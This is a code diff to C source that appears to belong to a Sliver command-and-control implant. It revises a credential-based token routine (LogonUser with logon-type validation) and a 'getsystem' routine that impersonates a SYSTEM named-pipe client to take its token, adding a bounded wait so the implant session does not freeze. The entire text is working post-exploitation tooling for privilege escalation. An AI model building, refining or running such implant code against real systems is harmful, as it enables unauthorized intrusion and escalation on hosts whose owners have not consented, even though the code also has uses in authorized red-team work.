@@ -17,7 +17,15 @@ int sliver_make_token(const char *username, const char *password, const char *do
                       uint32_t logon_type) {
   HANDLE token = NULL;
   BOOL ok;
-  DWORD type = logon_type != 0 ? (DWORD)logon_type : LOGON32_LOGON_INTERACTIVE;
+  DWORD type = (DWORD)logon_type;
+  /* Only LOGON32 types LogonUser accepts; anything else yields Win32 1367. */
+  if (type != LOGON32_LOGON_INTERACTIVE && type != LOGON32_LOGON_NETWORK &&
+      type != LOGON32_LOGON_BATCH && type != LOGON32_LOGON_SERVICE &&
+      type != LOGON32_LOGON_UNLOCK && type != LOGON32_LOGON_NETWORK_CLEARTEXT) {
+    LOG_DEBUG("token: logon type %lu not supported by LogonUser, using INTERACTIVE",
+              (unsigned long)type);
+    type = LOGON32_LOGON_INTERACTIVE;
+  }
 
   if (username == NULL || username[0] == 0) {
     return -1;
@@ -37,38 +45,51 @@ int sliver_make_token(const char *username, const char *password, const char *do
   return ok ? 0 : -1;
 }
 
-/* Named-pipe impersonation: create a pipe, let SYSTEM connect to it and steal the
- * token. Requires SeImpersonatePrivilege (admin/service context). */
+/* Named-pipe impersonation with a bounded wait: an unbounded ConnectNamedPipe
+ * froze the session (client saw "implant timeout"). */
 int sliver_get_system(void) {
   char name[128];
   HANDLE pipe;
-  HANDLE token = NULL;
+  OVERLAPPED ov;
   BOOL ok;
 
   (void)snprintf(name, sizeof(name), "\\\\.\\pipe\\sliver_%lu_%lu",
                  (unsigned long)GetCurrentProcessId(), (unsigned long)GetTickCount());
-  pipe = CreateNamedPipeA(name, PIPE_ACCESS_DUPLEX,
+  pipe = CreateNamedPipeA(name, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
                           PIPE_TYPE_MESSAGE | PIPE_WAIT | PIPE_REJECT_REMOTE_CLIENTS, 1, 4096,
                           4096, 0, NULL);
   if (pipe == INVALID_HANDLE_VALUE) {
     LOG_DEBUG("token: CreateNamedPipe failed (%lu)", (unsigned long)GetLastError());
     return -1;
   }
-  /* A SYSTEM-level trigger (e.g. a service connecting to the pipe) is required;
-   * without one this waits for the timeout and reports failure. */
-  ok = ConnectNamedPipe(pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED;
+  memset(&ov, 0, sizeof(ov));
+  ov.hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
+  ok = ConnectNamedPipe(pipe, &ov) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
+  if (!ok && GetLastError() == ERROR_IO_PENDING) {
+    /* No SYSTEM client shows up in a normal session: wait 3 s, then give up. */
+    if (WaitForSingleObject(ov.hEvent, 3000) == WAIT_OBJECT_0) {
+      DWORD dummy = 0;
+      ok = GetOverlappedResult(pipe, &ov, &dummy, FALSE);
+    }
+  }
+  if (ov.hEvent != NULL) {
+    (void)CloseHandle(ov.hEvent);
+  }
   if (ok && ImpersonateNamedPipeClient(pipe)) {
-    ok = OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_QUERY, TRUE, &token) &&
-         RevertToSelf();
+    HANDLE token = NULL;
+    BOOL got = OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_QUERY, TRUE, &token);
+    (void)RevertToSelf();
     if (token != NULL) {
       (void)CloseHandle(token);
     }
+    (void)DisconnectNamedPipe(pipe);
     (void)CloseHandle(pipe);
-    return ok ? 0 : -1;
+    return got ? 0 : -1;
   }
   LOG_DEBUG("token: getsystem failed (%lu)", (unsigned long)GetLastError());
   (void)DisconnectNamedPipe(pipe);
   (void)CloseHandle(pipe);
   return -1;
 }
+
 
